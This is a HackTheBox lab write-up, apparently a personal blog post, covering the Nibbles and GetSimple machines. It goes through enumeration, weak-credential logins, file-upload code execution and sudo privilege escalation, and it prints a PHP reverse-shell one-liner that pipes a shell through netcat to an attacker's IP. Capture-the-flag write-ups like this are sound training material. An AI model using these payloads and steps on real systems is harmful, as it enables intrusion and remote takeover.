---
layout: ../../layouts/MarkdownPostLayout.astro
title: HackTheBox Boxes
author: Jan Fok
description: "some vulnerable machines on HackTheBox"
image: 
  url: "data:image/png;base64,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"
  alt: "HackTheBox logo"

---

## Nibbles
#### Category: WebApp, Privilege Escalation
#### Vulnerabilities: World-writable File, Sudoers Misconfiguration

### Enumeration

First, I ran an nmap scan on the top 1000 ports on the system. We can see that there is an OpenSSH service running on port 22 and an Apache HTTP server running on port 80.

Using common HTTP scripts from Nmap Scripting Engine (NSE) does not yield anything useful.

### Web Footprinting

Using `whatweb`, we can check what web applications are in use on the server. When I access the web page on a web browser, I see an empty web page with words "Hello World!". Looking in the source code, there is a comment indicating the existence of a directory called `/nibbleblog/`.

Using `whatweb` on the nibbleblog directory, we can see the technologies in use, which includes HTML5, JQuery, PHP and nibbleblog. 

A google search for "nibbleblog exploits" yields a [Nibbleblog File Upload Vulnerability](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/ "rapid7 nibbleblog file upload vuln"). This flaw allows an authenticated attacker to upload and execute PHP code. 

The Metasploit version of th exploit was tested on version 4.0.3. However, we still don't know what version of nibbleblog is running on our target.

Looking at the source code in the Metasploit module, we can see that is requires a username and password to authenticate at the admin portal which is found at `admin.php`.

Next, I used `gobuster` to enumerate the directories available using `dirbuster's` common wordlist. The results returns 11 directories, which includes the `admin.php`, `/content` and `/README` directories. 

Curling the README page shows us that the version of nibbleblog running on the target is indeed v4.0.3. I now have confirmation that the web server is vulnerable to the exploit we have found.

Next, I need valid credentials to start the exploit. Looking through the "contents" folder, we find a file under a nested folder labelled "private" called "users.xml". Using the following command, we can obtain the xml data in our terminal:

```bash
curl http://[IP]/nibbleblog/content/private/users.xml | xmllint --format -
```

The file shows us that `admin` is indeed a valid username.

Next, we looked at the `config.xml` file. There are two mentions of `nibbles` in this file. According to HackTheBox, it is not uncommon to crack a password hash using a wordlist generated by crawling and scaping the website.

Using the credentials `admin:nibbles`, we were able to obtain access to the admin portal. 

Now that we have identified an exploit that would work on the target and we have valid credentials, we can begin with our exploitation.

### Initial Foothold

Looking around the admin portal, we find that we are able to upoad files under the `upload image` plugin. We then tested this by uploading a PHP script with some valid PHP code which returns the ID of the user.

```php
<?php system('id'); ?>
```

After uploading the file, we get a bunch of error messages which indicates that the file was uploaded successfully to the server. Next, we went back into the `/content` folder and found a nested file called `image.PHP`. Opening this file, we can see the id of the user printed inside. 

This indicates that we successfully obtained remote code execution (RCE). Next, we will update our code to upload a reverse shell back to our machine. We obtained the following code from [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings "Payload All The Things")

```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [Local IP] [Local Port] >/tmp/f'); ?>
```

I then used `netcat` to open a listening port on our machine to receive the reverse shell.

Uploading the reverse shell script onto the server and accessing the "image.php" file once again, I was able to obtain a reverse shell on my local machine.

I was able to obtain the user flag from the home directory.

### User Flag
**79c03865431abf47b90ef24b9695e148**

### Privilege Escalation
Next, I will try to escalate privileges to `root`. There is a zip file labelled `personal.zip` in the home directory. Unzipping the file, we find a file called `monitor.sh` inside it.

We next uploaded a [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh "LinEnum") Script which would enumerate a Linux machine locally. This was done using a python web server and curling the file on the target from our local machine. 

We then run the script and from the results of the enumeration, we can see that we have `sudo` access to run the `monitor.sh` file without requiring a password. 

We can then append a one-line reverse shell script to the `monitor.sh` file and run the file using sudo to obtain a reverse shell on our machine. 

Once we receive the the reverse shell, I was able to obtain the root flag from the root directory.

### Root Flag
**de5e5d6619862a8aa5b9b212314e0cdd**

---

## GetSimple
#### Category: WebApp, Privilege Escalation

### Enumeration

Running an nmap scan on the top 1000 ports with default scripts turned on, I discover the there is an OpenSSH server running on port 22 and an Apache server v2.4.41 running on port 80. The target is running Ubuntu Linux Focal Fossa 20.04.

Using the http-enum script with our scan on port 80, I can se that there is a `robots.txt` file in the web directory. 

### Web Footprinting

Next, I used `gobuster` to enumerate the directories on the web server. The results shows that there are the directories "/admin", "/robots.txt", "/plugins", "/theme" and "/data" on the web server.

Looking at the `robots.txt` file, we see that the directory `/admin/` is disallowed from being crawled. 

Looking at the admin portal, I tried the credentials `admin:admin` and managed to gain access.

I can then see that the webpage uses GetSimple CMS version 3.3.15.

After a quick google search for "GetSimple exploits", I found that there is an XSS vulnerability for GetSimple versions 3.3.15 and older. I also found out that the exploit was readily available on Metasploit. Using the Metasploit module, I was able to obtain a reverse shell into the machine and obtained the user flag.

### User Flag
**7002d65b149b0a4d19132a66feed21d8**

### Privilege Escalation

I uploaded a [LinPeas.sh](http://linpeas.sh/ "LinPeas") script to the target's `/var/www/html` directory to enumerate any privilege escalation vectors.

The results of the script tells us that the machine is vulnerable to two CVE's: 
* CVE-2021-4034
* CVE-2021-3560

I looked for the CVEs on Metasploit and found that they were both available as modules. However, they would both not work on the target machine. Then, I tried looking for publicly available Proof of Concepts (POC) but most of them were written in C and the target did not have gcc or clang installed. However I did realise that the target had python3 installed, so I found a POC written in python3 and ran the script on the target to obtain root privileges. 

### Root Flag
**f1fba6e9f71efb2630e6e34da6387842**

### Alternate Methods
Here, I tried to obtain the webshell without using the Metasploit module.

Doing some research on the GetSimple CMS exploit, I found a report online that described a vulnerability in the website's `theme-edit.php` file where it does not sanitize user input. This allows for arbitrary code execution. I uploaded a PHP reverse shell script to the page and obtained a reverse shell on my local machine. 
